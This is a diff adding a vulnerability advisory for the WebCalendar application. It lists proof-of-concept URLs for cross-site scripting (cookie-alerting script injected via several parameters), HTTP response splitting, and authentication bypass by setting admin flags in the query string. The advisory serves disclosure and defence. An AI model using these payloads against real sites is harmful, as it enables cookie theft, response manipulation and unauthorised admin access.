@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/11651/info
+
+Multiple remote vulnerabilities are reported to exist in WebCalendar.
+
+Multiple cross-site scripting vulnerabilites, an HTTP response splitting vulnerability, and two authentication bypass vulnerabilities are reported to exist in many different scripts in the affected application.
+
+Fixes are reported to exist in the CVS version of the software.
+
+http://www.example.com/view_entry.php?id=41972"><img%20src=http://images.sourceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>&date=20041001
+http://www.example.com/view_d.php?id=657"><img%20src=http://images.sourceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)%20height=0%20width=0>&date=20041009
+http://www.example.com/usersel.php?form=editentryform.elements[20];%0d%0aalert(document.cookie);//&listid=20&users=demo,demo1,demo2
+http://www.example.com/datesel.php?form=editentryform.elements[20].rpt_day.selectedIndex%20=%20day%20-%201;alert(document.cookie);//"><img%20src=http://images.sourceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>&fday=rpt_day&fmonth=rpt_month&fyear=rpt_year&date=20041001
+http://www.example.com/datesel.php?form=editentryform&fday=rpt_day"%20onclick=javascript:alert(document.cookie)>&fmonth=rpt_month&fyear=rpt_year&date=20041001
+http://www.example.com/includes/trailer.php?user="><img%20src=http://images.sourceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>
+http://www.example.com/includes/styles.php?FONTS=asdf}%0A--></style><script>alert(document.cookie)</script>
+
+Example for the HTTP response splitting vulnerability:
+http://www.example.com/login.php?return_path=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0dContent-Type:text/html%0d%0aContent-Length:9%0d%0aHi to all
+
+Examples for the authentication bypass vulnerabilities:
+http://www.example.com/view_entry.php?id=41972&date=20041001&is_admin=true&is_nonuser_admin=true&is_assistant=true
+http://www.example.com/upcoming.php?public_must_be_enabled=true&public_access=Y
